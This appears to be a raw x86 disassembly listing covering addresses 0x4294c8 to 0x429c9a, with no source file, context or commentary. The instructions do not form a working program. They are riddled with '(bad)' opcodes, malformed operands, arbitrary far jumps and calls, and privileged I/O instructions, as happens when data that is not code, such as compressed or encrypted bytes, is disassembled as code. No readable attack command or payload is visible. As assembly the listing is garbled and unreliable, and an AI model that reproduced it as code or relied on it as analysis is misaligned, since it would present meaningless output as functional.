  4294c8:	xor    DWORD PTR [eax],esp
  4294ca:	aad    0xad
  4294cc:	jno    0x4294a9
  4294ce:	add    BYTE PTR [ecx+0x7d],0x31
  4294d2:	and    al,0x5d
  4294d4:	retf   
  4294d5:	(bad)  
  4294d6:	sbb    BYTE PTR [ebp+0x56360fc2],ch
  4294dc:	jmp    0xebb5:0x936e5fa5
  4294e3:	fnsave [esi+0x39b18dda]
  4294e9:	jbe    0x4294dc
  4294eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4294ec:	(bad)  [ebp-0x4935a0e6]
  4294f2:	ins    DWORD PTR es:[edi],dx
  4294f3:	sbb    eax,0x466e86b4
  4294f8:	dec    esp
  4294f9:	inc    esp
  4294fa:	(bad)  
  4294fc:	mov    ?,WORD PTR [edx+0x4b]
  4294ff:	rol    dh,0xc2
  429502:	pop    ds
  429503:	push   0xffffff90
  429505:	nop
  429506:	dec    eax
  429507:	push   edx
  429508:	xchg   ebp,eax
  429509:	test   eax,0xb3543250
  42950e:	push   es
  42950f:	test   ebp,0x6b6dd15c
  429515:	sbb    eax,0x16817e8
  42951a:	inc    ebx
  42951b:	pop    esi
  42951c:	adc    eax,0xf5a8585c
  429521:	adc    al,ah
  429523:	mov    edi,0xa0e8361b
  429528:	jbe    0x4294fd
  42952a:	popa   
  42952b:	data16 es or al,0xad
  42952f:	and    eax,0xb82c2ed5
  429534:	mov    BYTE PTR [esp+edi*1+0x1a5ec394],ch
  42953b:	fmul   QWORD PTR [edx+0x51]
  42953e:	mov    eax,0x259e6473
  429543:	pop    esi
  429544:	and    esp,DWORD PTR [ebp+0x1f]
  429547:	pusha  
  429548:	mov    ebx,0x9a9000d1
  42954d:	add    esp,DWORD PTR [ebx-0x9]
  429550:	fnsave [ebp+0x50]
  429553:	stos   BYTE PTR es:[edi],al
  429554:	fcomp  DWORD PTR [edx+0x623b6ed4]
  42955a:	shl    DWORD PTR [esi],cl
  42955c:	pop    edx
  42955d:	mov    bh,0x2
  42955f:	mov    bh,0x1a
  429561:	(bad)  
  429562:	out    dx,al
  429563:	inc    eax
  429564:	jnp    0x429581
  429566:	fist   DWORD PTR [esi+0x59ef9616]
  42956c:	pop    eax
  42956d:	cld    
  42956e:	add    DWORD PTR [edx+0x2805d5d7],0x32
  429575:	das    
  429576:	jne    0x4295cb
  429578:	and    DWORD PTR [esp+edx*8],esp
  42957b:	add    BYTE PTR [edi],ch
  42957d:	ins    DWORD PTR es:[edi],dx
  42957e:	ins    DWORD PTR es:[edi],dx
  42957f:	mov    ebx,0xca108050
  429584:	sbb    al,BYTE PTR [edx+0x5644f226]
  42958a:	adc    eax,esp
  42958c:	add    ch,BYTE PTR [ebp-0x3aea8f56]
  429592:	call   0x69b0044d
  429597:	push   edi
  429598:	mov    bl,0x32
  42959a:	xor    DWORD PTR [edx+edx*4],edx
  42959d:	jbe    0x429533
  42959f:	dec    ecx
  4295a0:	out    dx,al
  4295a1:	jno    0x4295fe
  4295a3:	call   0xa1088450
  4295a8:	into   
  4295a9:	push   ds
  4295aa:	mov    BYTE PTR [edx+0x1362fda1],al
  4295b0:	mov    esp,0x6009cfa0
  4295b5:	(bad)  
  4295b6:	enter  0x76e2,0x69
  4295ba:	mov    ds:0x9bd31674,eax
  4295bf:	pusha  
  4295c0:	outs   dx,DWORD PTR ds:[esi]
  4295c1:	and    edx,DWORD PTR [edx+0x2a]
  4295c4:	push   ebx
  4295c5:	mov    dh,0x8d
  4295c7:	(bad)  
  4295c8:	fisubr DWORD PTR [esp+esi*2-0x3]
  4295cc:	jae    0x4295a3
  4295ce:	sub    eax,DWORD PTR [ecx-0x3e]
  4295d1:	mov    cl,0xd4
  4295d3:	and    dh,BYTE PTR [esi]
  4295d5:	sub    ch,BYTE PTR [esi+ebx*2-0x74]
  4295d9:	jmp    0x4295c8
  4295db:	inc    esi
  4295dc:	mov    ebx,0x55ef8ab0
  4295e1:	cmp    ch,ah
  4295e3:	xchg   ebp,eax
  4295e4:	inc    DWORD PTR [edi+ebx*8]
  4295e7:	clc    
  4295e8:	adc    DWORD PTR [edi-0x240175e6],esi
  4295ee:	seta   BYTE PTR [esi-0x55c5e922]
  4295f5:	sbb    ah,BYTE PTR ss:[eax]
  4295f8:	sbb    BYTE PTR [ebp-0x9],0x2b
  4295fc:	cmp    eax,0xdb6372c0
  429601:	xchg   ebp,eax
  429602:	adc    eax,0x6fc3b286
  429607:	push   edi
  429608:	ror    BYTE PTR [eax-0x13ecbfa6],cl
  42960e:	mov    esp,0x6e8aba0f
  429613:	xchg   esp,eax
  429614:	or     bl,BYTE PTR [esi]
  429616:	jecxz  0x42964a
  429618:	push   0xb6362b2a
  42961d:	ss adc eax,0x78958299
  429623:	std    
  429624:	cmp    al,0xa5
  429626:	mov    dh,0xa3
  429628:	pusha  
  429629:	mov    eax,ds:0x11aa7542
  42962e:	es ins BYTE PTR es:[edi],dx
  429630:	xor    eax,0x44cbb744
  429635:	cdq    
  429636:	fst    QWORD PTR [edx+0x79]
  429639:	pop    ebx
  42963a:	push   ebp
  42963b:	jbe    0x429612
  42963d:	lods   eax,DWORD PTR ds:[esi]
  42963e:	inc    ecx
  42963f:	inc    edx
  429640:	mov    eax,ds:0x830474b8
  429645:	jl     0x4296b4
  429647:	or     ebx,DWORD PTR [ebx+0x59a5c2a0]
  42964d:	add    al,0x11
  42964f:	(bad)  
  429650:	cld    
  429651:	xor    eax,0x98b6b700
  429656:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429657:	push   0x4890f9da
  42965c:	iret   
  42965d:	sbb    ch,BYTE PTR [edx-0x7e]
  429660:	mov    edx,0x29a9587a
  429665:	out    dx,al
  429666:	lods   eax,DWORD PTR ds:[esi]
  429667:	add    ah,BYTE PTR [ecx+0x6f02eb74]
  42966d:	dec    edx
  42966e:	retf   
  42966f:	add    esp,ecx
  429671:	pop    edi
  429672:	push   edx
  429673:	sbb    edx,DWORD PTR [ecx+0x2d]
  429676:	bound  edi,QWORD PTR [eax+0x10]
  429679:	enter  0xb695,0xd5
  42967d:	push   eax
  42967e:	ins    BYTE PTR es:[edi],dx
  42967f:	repnz xor eax,0xffffffa4
  429683:	push   edx
  429684:	jnp    0x4296f7
  429686:	mov    dh,0xb0
  429688:	ins    DWORD PTR es:[edi],dx
  429689:	fisttp DWORD PTR [ebx+0x4832f5bc]
  42968f:	sbb    DWORD PTR [ebx+0x25],0xffffff8f
  429693:	inc    esp
  429694:	pop    ebp
  429695:	(bad)  
  429696:	(bad)  
  429697:	lds    ecx,FWORD PTR [ebp-0x4]
  42969a:	mov    dh,0x1a
  42969c:	pop    es
  42969d:	push   0x73
  42969f:	sub    eax,0x5f6d06a8
  4296a4:	jle    0x4296e6
  4296a6:	scas   eax,DWORD PTR es:[edi]
  4296a7:	outs   dx,DWORD PTR ds:[esi]
  4296a8:	fdivr  QWORD PTR [edx+0x42b1b88]
  4296ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4296af:	test   BYTE PTR [edi+0x9004733],bl
  4296b5:	aam    0xb6
  4296b7:	aam    0x96
  4296b9:	sar    DWORD PTR [eax-0x793eb874],cl
  4296bf:	outs   dx,BYTE PTR ds:[esi]
  4296c0:	shl    DWORD PTR [edx],1
  4296c2:	mov    dh,0x42
  4296c4:	jne    0x429646
  4296c6:	leave  
  4296c7:	call   0x9b8d:0xbb451adb
  4296ce:	popf   
  4296cf:	or     esp,DWORD PTR [ebx]
  4296d1:	es repz out dx,eax
  4296d4:	popa   
  4296d5:	adc    eax,eax
  4296d7:	jbe    0x4296a5
  4296d9:	arpl   WORD PTR [ebx+ecx*1+0x77],si
  4296dd:	(bad)  
  4296de:	mov    al,ds:0x5b111df7
  4296e3:	push   edi
  4296e4:	jg     0x429746
  4296e6:	mov    eax,ds:0x9bd36d62
  4296eb:	add    BYTE PTR [esi+0x4a51f40b],dh
  4296f1:	sti    
  4296f2:	push   edi
  4296f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4296f4:	jmp    0xa250:0x15d8833e
  4296fb:	imul   ebx,ecx,0xffffff9f
  4296fe:	sbb    ah,BYTE PTR [edx+0x7]
  429701:	mov    al,0xd0
  429703:	ss clc 
  429705:	sbb    eax,0x76fc9f06
  42970a:	inc    ecx
  42970b:	ins    BYTE PTR es:[edi],dx
  42970c:	fstp   QWORD PTR [ecx+0x31]
  42970f:	mov    esp,DWORD PTR ds:0x2fb94e65
  429715:	mov    dh,0x7c
  429717:	imul   ebp,DWORD PTR [edx],0x28
  42971a:	inc    edx
  42971b:	pop    edi
  42971c:	ret    0x11
  42971f:	cli    
  429720:	or     ebp,DWORD PTR fs:[ebp-0x5f]
  429724:	ins    DWORD PTR es:[edi],dx
  429725:	rcr    DWORD PTR [ebx],0x9d
  429728:	or     edx,eax
  42972a:	and    eax,0x50bb35f8
  42972f:	push   ebx
  429730:	lds    esi,FWORD PTR [edx-0x22c43e3c]
  429736:	and    edi,DWORD PTR ds:0xdb8db6f8
  42973c:	inc    edx
  42973d:	(bad)  
  42973e:	inc    esi
  42973f:	(bad)  
  429740:	cmp    ebx,ecx
  429742:	xchg   esi,eax
  429743:	fadd   st(5),st
  429745:	inc    dl
  429747:	(bad)  
  429748:	mov    eax,0x52f141d0
  42974d:	mov    ds:0xbbc7f266,eax
  429752:	mov    ah,0x81
  429754:	loopne 0x42972c
  429756:	jg     0x42976e
  429758:	test   eax,0x729cecfa
  42975d:	fcmovnbe st,st(2)
  42975f:	push   esi
  429760:	pop    es
  429761:	dec    edi
  429762:	add    ah,0xce
  429765:	ret    0x7d56
  429768:	dec    ebp
  429769:	(bad)  
  42976a:	add    BYTE PTR [edx],bh
  42976c:	mov    al,ds:0xddafaf34
  429771:	sbb    al,BYTE PTR [ebp+0x35e02bad]
  429777:	pop    ecx
  429778:	xchg   esi,eax
  429779:	mov    ch,0x1d
  42977b:	shl    ch,1
  42977d:	inc    ecx
  42977e:	test   eax,0xcfbe8b6a
  429783:	outs   dx,BYTE PTR ss:[esi]
  429785:	push   es
  429786:	sbb    ebx,ebx
  429788:	mov    dh,0x2
  42978a:	xchg   BYTE PTR [ebp+eax*2+0x6e],dh
  42978e:	cmc    
  42978f:	add    ebx,DWORD PTR [eax]
  429791:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429792:	or     eax,0xf1d152c0
  429797:	fimul  WORD PTR [edx+0xf]
  42979a:	jns    0x429757
  42979c:	sub    eax,0x3baa6e94
  4297a1:	out    dx,eax
  4297a2:	ret    0xc05e
  4297a5:	add    ch,BYTE PTR [esi+0x2d]
  4297a8:	and    eax,DWORD PTR [ebp+0x3444c36d]
  4297ae:	xchg   ebx,eax
  4297af:	jno    0x4297a3
  4297b1:	pop    ecx
  4297b2:	imul   DWORD PTR [edx]
  4297b4:	pusha  
  4297b5:	pop    es
  4297b6:	shl    DWORD PTR [ebp+0x6b3a2510],0xb7
  4297bd:	jbe    0x42979a
  4297bf:	push   0xffffffe2
  4297c1:	fnstenv [esi+eiz*1]
  4297c4:	dec    edx
  4297c5:	call   0x362e:0xc098b984
  4297cc:	ss push ss
  4297ce:	sbb    ch,BYTE PTR [ebx-0x3b60a1c0]
  4297d4:	inc    ebp
  4297d5:	not    BYTE PTR [ecx-0x4c]
  4297d8:	test   al,0x16
  4297da:	mov    esp,DWORD PTR [ebx-0x77]
  4297dd:	pop    edx
  4297de:	mov    dh,0xda
  4297e0:	lods   eax,DWORD PTR ds:[esi]
  4297e1:	jp     0x4297f4
  4297e3:	stos   BYTE PTR es:[edi],al
  4297e4:	dec    eax
  4297e5:	sahf   
  4297e6:	fmul   QWORD PTR [eax]
  4297e8:	cmp    eax,0x5b76c7d2
  4297ed:	mov    DWORD PTR es:[esi-0x3573b078],eax
  4297f4:	mov    bh,0x80
  4297f6:	clc    
  4297f7:	ins    DWORD PTR es:[edi],dx
  4297f8:	jmp    0x4297a2
  4297fa:	(bad)  [edi+0x51d69d53]
  429800:	xchg   DWORD PTR [ecx-0x4957e52f],edi
  429806:	or     BYTE PTR [esi+0x87e2918],dh
  42980c:	aam    0xb0
  42980e:	ins    DWORD PTR es:[edi],dx
  42980f:	lods   eax,DWORD PTR ds:[esi]
  429810:	xchg   bp,ax
  429812:	loop   0x4297db
  429814:	and    dl,dh
  429816:	xor    ah,BYTE PTR [ecx]
  429818:	lea    eax,[esi-0x4c]
  42981b:	mov    al,0x5e
  42981d:	push   eax
  42981e:	jbe    0x429867
  429820:	mov    bh,0x3c
  429822:	sbb    dl,BYTE PTR [eax-0x72]
  429825:	fimul  DWORD PTR [esi]
  429827:	push   edx
  429828:	mov    ecx,0x536dd216
  42982d:	mov    cl,0xdd
  42982f:	jno    0x42986a
  429831:	mov    cl,0xbf
  429833:	pushf  
  429834:	mov    eax,0xb8ad069b
  429839:	mov    al,0xb5
  42983b:	dec    ebx
  42983c:	mov    esp,0x95a1dede
  429841:	add    eax,0xc607d6c4
  429846:	inc    edx
  429847:	add    edi,ebp
  429849:	daa    
  42984a:	out    0x78,eax
  42984c:	retf   
  42984d:	stc    
  42984e:	(bad)  
  42984f:	fiadd  DWORD PTR [ebx]
  429851:	mov    dh,0x6d
  429853:	aad    0xd6
  429855:	xchg   edx,eax
  429856:	fs test al,0xee
  429859:	call   0xf2d2:0xede0ed59
  429860:	rcl    ah,cl
  429862:	and    ebp,edi
  429864:	add    BYTE PTR [ebp-0x2d69252b],bl
  42986a:	lods   eax,DWORD PTR ds:[esi]
  42986b:	mov    dh,0xb
  42986d:	test   DWORD PTR [ebp+0x2be43d9b],eax
  429873:	out    dx,al
  429874:	pop    es
  429875:	lock pop ecx
  429877:	mov    ebx,esp
  429879:	fisubr DWORD PTR [eax+0xa]
  42987c:	sub    eax,0xcdd8cc83
  429881:	mov    ds:0x9410b60a,al
  429886:	das    
  429887:	mov    ds:0x753200a1,eax
  42988c:	cmc    
  42988d:	inc    esp
  42988e:	mov    ecx,0xd1176abb
  429893:	dec    ecx
  429894:	aas    
  429895:	icebp  
  429896:	scas   al,BYTE PTR es:[edi]
  429897:	or     dl,BYTE PTR [ebx+eax*4+0x6b60da5b]
  42989e:	sub    ebx,edi
  4298a0:	xor    bl,ah
  4298a2:	in     eax,dx
  4298a3:	clc    
  4298a4:	and    ah,BYTE PTR [edx-0x25]
  4298a7:	mov    dh,0x8d
  4298a9:	gs sahf 
  4298ab:	rol    DWORD PTR [ebx],cl
  4298ad:	adc    bl,BYTE PTR [edx]
  4298af:	rol    BYTE PTR [esp+edx*8+0x38],0x1b
  4298b4:	ins    DWORD PTR es:[edi],dx
  4298b5:	push   ebx
  4298b6:	jno    0x4298e4
  4298b8:	sub    eax,0x6201d70d
  4298bd:	test   cl,0xb0
  4298c0:	mov    cl,0xd0
  4298c2:	outs   dx,BYTE PTR ds:[esi]
  4298c3:	stos   BYTE PTR es:[edi],al
  4298c4:	xor    eax,ebx
  4298c6:	je     0x429880
  4298c8:	inc    edx
  4298c9:	pushf  
  4298ca:	(bad)  
  4298cb:	mov    al,ds:0x144a16dd
  4298d0:	mov    dl,0xb0
  4298d2:	xor    bl,BYTE PTR ds:0x1ad89b02
  4298d8:	push   0xffffffeb
  4298da:	lds    edx,FWORD PTR [edi]
  4298dc:	mov    bl,0xdb
  4298de:	add    al,0x79
  4298e0:	inc    ecx
  4298e1:	retf   
  4298e2:	fild   DWORD PTR [ebp-0xc11a24a]
  4298e8:	adc    DWORD PTR [ebp+0x29],ecx
  4298eb:	mov    ecx,ebx
  4298ed:	xor    al,0x77
  4298ef:	out    dx,eax
  4298f0:	pop    ds
  4298f1:	aad    0x50
  4298f3:	pop    ebp
  4298f4:	push   0x17
  4298f6:	push   cs
  4298f7:	dec    ch
  4298f9:	enter  0xb637,0x5b
  4298fd:	loope  0x4298b5
  4298ff:	dec    ecx
  429900:	xchg   ebp,eax
  429901:	inc    esp
  429902:	inc    edi
  429903:	inc    esi
  429904:	popa   
  429905:	adc    BYTE PTR [ebp-0x526a0a40],0xf
  42990c:	in     al,dx
  42990d:	or     BYTE PTR [edi],dh
  42990f:	stos   BYTE PTR es:[edi],al
  429910:	mov    dh,0xf9
  429912:	xchg   edx,eax
  429913:	aaa    
  429914:	test   eax,0x883adb76
  429919:	imul   esi,DWORD PTR [edx+0x4e],0x57386cef
  429920:	pop    esp
  429921:	xchg   ebp,eax
  429922:	pop    ebx
  429923:	test   eax,0xddd7b635
  429928:	xchg   DWORD PTR [ebp+eax*8+0x6e],edi
  42992c:	lds    ebx,FWORD PTR [ebp+0x5]
  42992f:	cmp    ebp,DWORD PTR [edx-0x623f6829]
  429935:	jo     0x4298e3
  429937:	gs stos DWORD PTR es:[edi],eax
  429939:	inc    ecx
  42993a:	ins    DWORD PTR es:[edi],dx
  42993b:	pop    esp
  42993c:	call   0xad6e:0x343db56b
  429943:	mov    esp,DWORD PTR [ecx+eiz*8+0x72]
  429947:	adc    al,0xd4
  429949:	call   0xbaca9f5b
  42994e:	mov    cl,0x6d
  429950:	add    BYTE PTR [ebx],bh
  429952:	ds (bad) 
  429954:	cld    
  429955:	fidivr DWORD PTR [esi+0x1a]
  429958:	push   ecx
  429959:	pop    ss
  42995a:	ins    DWORD PTR es:[edi],dx
  42995b:	mov    cl,0x53
  42995d:	jmp    0x16b6:0xd954b4a4
  429964:	xchg   esi,eax
  429965:	or     DWORD PTR [edi+0x3d],0xffffff8e
  429969:	hlt    
  42996a:	inc    eax
  42996b:	fisub  DWORD PTR [esi+esi*4-0x7a92e56b]
  429972:	sbb    dh,BYTE PTR [esi-0xe]
  429975:	fnstsw WORD PTR [esi-0x6e]
  429978:	inc    esi
  429979:	arpl   WORD PTR [ecx+0x2f39e6c0],di
  42997f:	cli    
  429980:	lods   eax,DWORD PTR ds:[esi]
  429981:	mov    dh,BYTE PTR [edx-0x4a]
  429984:	test   ebp,ebp
  429986:	ret    0x7c88
  429989:	mov    eax,ds:0x4f411133
  42998e:	xor    al,0x6e
  429990:	push   eax
  429991:	dec    edx
  429992:	inc    ecx
  429993:	pop    ebx
  429994:	fisub  DWORD PTR [ebp+0x55]
  429997:	add    DWORD PTR [ebx],0xffffff86
  42999a:	or     al,0xa8
  42999c:	fild   DWORD PTR [edx-0x5f]
  42999f:	pop    es
  4299a0:	cmp    bh,dl
  4299a2:	mov    eax,ds:0x16dde925
  4299a7:	mov    dh,0xae
  4299a9:	push   ecx
  4299aa:	push   ss
  4299ab:	sbb    bl,BYTE PTR ds:0x1b050e61
  4299b1:	push   ebp
  4299b2:	or     ecx,DWORD PTR [ebx]
  4299b4:	pop    ebx
  4299b5:	inc    ebx
  4299b6:	fmul   st(6),st
  4299b8:	and    ebp,DWORD PTR [ebp+0xa]
  4299bb:	mov    al,ds:0xdb6d66a6
  4299c0:	(bad)  
  4299c1:	mov    dh,0xb0
  4299c3:	mov    eax,ds:0xf17408b4
  4299c8:	inc    esp
  4299c9:	push   esp
  4299ca:	sub    DWORD PTR [edi-0x5d],ebp
  4299cd:	add    BYTE PTR ds:0xf2cc622d,ch
  4299d3:	pop    ecx
  4299d4:	cmp    al,dh
  4299d6:	sub    BYTE PTR [esi+0x74],bh
  4299d9:	popa   
  4299da:	dec    eax
  4299db:	(bad)  
  4299dd:	fisubr DWORD PTR [edx+esi*1-0x27a69210]
  4299e4:	cmp    al,BYTE PTR [ecx+0x3de335eb]
  4299ea:	xchg   esp,eax
  4299eb:	mov    bl,0xaa
  4299ed:	mov    ch,0x6d
  4299ef:	stc    
  4299f0:	(bad)  
  4299f1:	xor    BYTE PTR [edi],bh
  4299f3:	loope  0x429a74
  4299f5:	add    BYTE PTR [edi+eiz*1-0x1],bh
  4299f9:	or     esp,DWORD PTR [ebx+0x52ea3bf2]
  4299ff:	mov    ebx,0xd158d2da
  429a04:	dec    edx
  429a05:	push   es
  429a06:	mov    esi,0xda4d7921
  429a0b:	push   esp
  429a0c:	mov    ah,0x6d
  429a0e:	imul   ebp,DWORD PTR [eax-0x5bc9089e],0x57
  429a15:	(bad)  
  429a16:	fsubr  DWORD PTR [edx-0x5e]
  429a19:	arpl   WORD PTR [edi-0x27079809],bp
  429a1f:	fcom   DWORD PTR [esi-0x78f7584a]
  429a25:	ret    0x65e7
  429a28:	push   cs
  429a29:	xchg   ebx,eax
  429a2a:	push   0x40
  429a2c:	pop    ebx
  429a2d:	and    bl,dl
  429a2f:	daa    
  429a30:	jg     0x429aa8
  429a32:	sub    eax,0x56ed8544
  429a37:	mov    eax,0x13150a3f
  429a3c:	push   cs
  429a3d:	dec    eax
  429a3e:	leave  
  429a3f:	adc    al,0x1d
  429a41:	ins    DWORD PTR es:[edi],dx
  429a42:	fwait
  429a43:	stos   BYTE PTR es:[edi],al
  429a44:	fisubr DWORD PTR [esi-0x1d]
  429a47:	mov    cl,0x86
  429a49:	in     al,dx
  429a4a:	enter  0xef17,0x2
  429a4e:	fsubr  DWORD PTR [esi+0x35]
  429a51:	add    DWORD PTR ds:0x8b9e94ee,esp
  429a57:	mov    eax,ds:0x6e8bb638
  429a5c:	rcl    BYTE PTR [edi-0x5],1
  429a5f:	or     eax,0x3545ec8c
  429a64:	adc    DWORD PTR [eax+0x26b76b6d],esp
  429a6a:	popa   
  429a6b:	push   ecx
  429a6c:	pop    ecx
  429a6d:	xchg   ebp,eax
  429a6e:	sbb    eax,edx
  429a70:	in     al,0x5d
  429a72:	clc    
  429a73:	jmp    0xb9a0:0x50025956
  429a7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429a7b:	std    
  429a7c:	and    DWORD PTR [eax],ebx
  429a7e:	push   edx
  429a7f:	fld    TBYTE PTR [esi+0x7d]
  429a82:	int    0xef
  429a84:	cmp    dh,ch
  429a86:	or     edx,DWORD PTR [ebp*4-0x723fca62]
  429a8d:	ins    DWORD PTR es:[edi],dx
  429a8e:	stc    
  429a8f:	retf   
  429a90:	cmc    
  429a91:	add    al,bl
  429a93:	mov    esp,0x4f9f50a4
  429a98:	addr16 push esp
  429a9a:	fstp   st(2)
  429a9c:	mov    dh,0xb1
  429a9e:	and    al,bh
  429aa0:	xor    BYTE PTR [edi+0x5f],dh
  429aa3:	sahf   
  429aa4:	adc    DWORD PTR [esi+0x4636d010],esi
  429aaa:	jb     0x429b1a
  429aac:	repnz mov bh,0xae
  429aaf:	bound  esi,QWORD PTR [ebp+0x6b]
  429ab2:	mov    bh,0x85
  429ab4:	jae    0x429aec
  429ab6:	jmp    0x6c20883b
  429abb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429abc:	sub    ebx,DWORD PTR [ebx-0x5b]
  429abf:	push   0xffffffa1
  429ac1:	shl    ah,1
  429ac3:	push   ss
  429ac4:	xchg   ebx,eax
  429ac5:	inc    esi
  429ac6:	add    ebx,ebp
  429ac8:	stos   BYTE PTR es:[edi],al
  429ac9:	fisubr DWORD PTR [esi-0x35]
  429acc:	call   0xe63d513e
  429ad1:	add    ch,bh
  429ad3:	push   0xffffffcb
  429ad5:	jg     0x429b40
  429ad7:	jbe    0x429b2f
  429ad9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429ada:	imul   eax,DWORD PTR [eax],0x46005c17
  429ae0:	push   esp
  429ae1:	scas   eax,DWORD PTR es:[edi]
  429ae2:	test   eax,0x5c507410
  429ae7:	mov    edx,esi
  429ae9:	xchg   esp,eax
  429aea:	mul    bl
  429aec:	fsubr  DWORD PTR [eax+0x37]
  429aef:	pop    edx
  429af0:	cmp    edi,DWORD PTR [edi]
  429af2:	mov    ebx,0x9c394ae2
  429af7:	dec    ebx
  429af8:	add    eax,0x39e85c68
  429afd:	icebp  
  429afe:	iret   
  429aff:	shl    DWORD PTR [ebx],cl
  429b01:	ds sbb ebp,edx
  429b04:	mov    dh,0x6d
  429b06:	out    dx,eax
  429b07:	daa    
  429b08:	xor    eax,0x4a11da3a
  429b0d:	pop    ds
  429b0e:	into   
  429b0f:	xchg   esi,eax
  429b10:	jne    0x429b6d
  429b12:	sub    bl,BYTE PTR [ebx]
  429b14:	scas   al,BYTE PTR es:[edi]
  429b15:	add    al,0x71
  429b17:	or     ch,dh
  429b19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429b1a:	iret   
  429b1b:	mov    dh,0xb0
  429b1d:	push   ecx
  429b1e:	mov    esi,0xdf00b5d3
  429b23:	outs   dx,BYTE PTR ds:[esi]
  429b24:	int3   
  429b25:	std    
  429b26:	sub    ebp,DWORD PTR [eax+0x32]
  429b29:	ins    DWORD PTR es:[edi],dx
  429b2a:	imul   esp,DWORD PTR [edx],0xffffff8a
  429b2d:	push   ss
  429b2e:	sbb    DWORD PTR [eax+ebp*8],ebp
  429b31:	jecxz  0x429b8e
  429b33:	adc    BYTE PTR [ebp+eax*4-0x4e],ch
  429b37:	push   ss
  429b38:	loopne 0x429af8
  429b3a:	sahf   
  429b3b:	jb     0x429ae2
  429b3d:	or     ecx,DWORD PTR ds:0x7c3adc05
  429b43:	jnp    0x429aef
  429b45:	pop    edi
  429b46:	adc    eax,0xa81b6db1
  429b4b:	call   0x86b5:0x6dd49047
  429b52:	mov    dh,0xb0
  429b54:	jmp    0x71bcb4da
  429b59:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  429b5b:	xchg   ebp,eax
  429b5c:	test   eax,0xb6b6d16d
  429b61:	cs pop ss
  429b63:	and    DWORD PTR [ebp+edi*1+0x35],esi
  429b67:	sahf   
  429b68:	(bad)
  429b6b:	arpl   WORD PTR [esi],sp
  429b6d:	imul   eax,DWORD PTR [eax-0x29],0xc4536f7b
  429b74:	lods   eax,DWORD PTR ds:[esi]
  429b75:	push   ecx
  429b76:	je     0x429bc8
  429b78:	cwde   
  429b79:	(bad)  
  429b7a:	cmp    BYTE PTR [ecx*1+0x4b65858],dl
  429b81:	and    BYTE PTR [edx+0x40],dh
  429b84:	test   DWORD PTR [edx+0x4b],edx
  429b87:	test   al,0xdd
  429b89:	sbb    al,0x1b
  429b8b:	cdq    
  429b8c:	jmp    0x429b0f
  429b8e:	dec    ebp
  429b8f:	mov    WORD PTR [esi],?
  429b91:	mov    edi,0x35b0ba8b
  429b96:	mov    BYTE PTR [eax-0x70e011a0],dh
  429b9c:	cmp    DWORD PTR [ebp+ebp*2+0x20e9844b],esi
  429ba3:	dec    ebp
  429ba4:	int3   
  429ba5:	and    esi,0xffffffbe
  429ba8:	outs   dx,BYTE PTR ds:[esi]
  429ba9:	push   eax
  429baa:	mov    edx,0x542e2f5
  429baf:	dec    ebp
  429bb0:	sub    ebx,edx
  429bb2:	fsub   QWORD PTR [esi]
  429bb4:	add    BYTE PTR [eax+0x1680dadd],dh
  429bba:	dec    esp
  429bbb:	add    eax,0xedbcbc17
  429bc0:	sub    BYTE PTR [eax-0x13f45e8b],bh
  429bc6:	jl     0x429bb6
  429bc8:	jmp    DWORD PTR ds:0xa5c50d4b
  429bce:	lods   eax,DWORD PTR ds:[esi]
  429bcf:	jge    0x429c39
  429bd1:	mov    al,ch
  429bd3:	mov    ch,0x9d
  429bd5:	aas    
  429bd6:	addr16 call 0x2cf05206
  429bdc:	fisttp WORD PTR [eax-0x79d8beaa]
  429be2:	imul   ecx,DWORD PTR [ecx+0xca65da2],0x2e
  429be9:	pop    ss
  429bea:	sbb    bh,bl
  429bec:	call   0xf1dc:0x42dbaa9b
  429bf3:	dec    ebp
  429bf4:	push   0xbab68ad2
  429bf9:	or     BYTE PTR [esi+0x5d],ch
  429bfc:	adc    eax,0x92c21912
  429c01:	and    al,BYTE PTR [esi-0x35797460]
  429c07:	add    esi,DWORD PTR [ecx+0x3441a7]
  429c0d:	fiadd  DWORD PTR ss:[ecx+0x15b483a0]
  429c14:	cld    
  429c15:	xchg   BYTE PTR [edx],al
  429c17:	cs sub al,0xf1
  429c1a:	pushf  
  429c1b:	xor    esi,edi
  429c1d:	inc    edx
  429c1e:	out    0x1b,eax
  429c20:	pop    ss
  429c21:	fcmovbe st,st(6)
  429c23:	bound  edi,QWORD PTR [ebp-0x2c8eabdb]
  429c29:	inc    edx
  429c2a:	shl    BYTE PTR [ecx],1
  429c2c:	pop    edi
  429c2d:	mov    dh,0x6d
  429c2f:	sbb    esp,ebp
  429c31:	add    BYTE PTR [eax-0x2e2e7e3d],dl
  429c37:	push   edi
  429c38:	sbb    eax,0xb4b14d3
  429c3d:	pop    es
  429c3e:	loop   0x429c0d
  429c40:	or     ebx,ebp
  429c42:	sub    BYTE PTR [ecx-0x65],0xa7
  429c46:	shr    DWORD PTR [ebp-0x7e937df7],0xc8
  429c4d:	push   eax
  429c4e:	mov    al,0x40
  429c50:	inc    esi
  429c51:	sbb    DWORD PTR [eax+0x47],ebp
  429c54:	fstp   TBYTE PTR [edx+edx*2]
  429c57:	retf   
  429c58:	push   edi
  429c59:	adc    eax,0x9ed6ea9b
  429c5e:	pop    es
  429c5f:	jmp    0xc6ed:0xa0873e31
  429c66:	(bad)  
  429c67:	jbe    0x429ca2
  429c69:	cwde   
  429c6a:	sbb    edx,esp
  429c6c:	mov    edi,0x247a785c
  429c71:	push   0x8512e969
  429c76:	repz cmp eax,0xd798b834
  429c7c:	dec    edx
  429c7d:	push   eax
  429c7e:	fstp   st(2)
  429c80:	lods   eax,DWORD PTR ds:[esi]
  429c81:	jl     0x429c29
  429c83:	add    BYTE PTR [eax],bl
  429c85:	test   DWORD PTR [ebx],edi
  429c87:	call   0x7e634d1d
  429c8c:	sbb    bl,0xb6
  429c8f:	cmp    eax,0x4771892d
  429c94:	pop    es
  429c95:	retf   
  429c96:	mov    edx,esp
  429c98:	mov    ch,0x44
  429c9a:	or     ebp,DWORD PTR ds:0xef8268dc
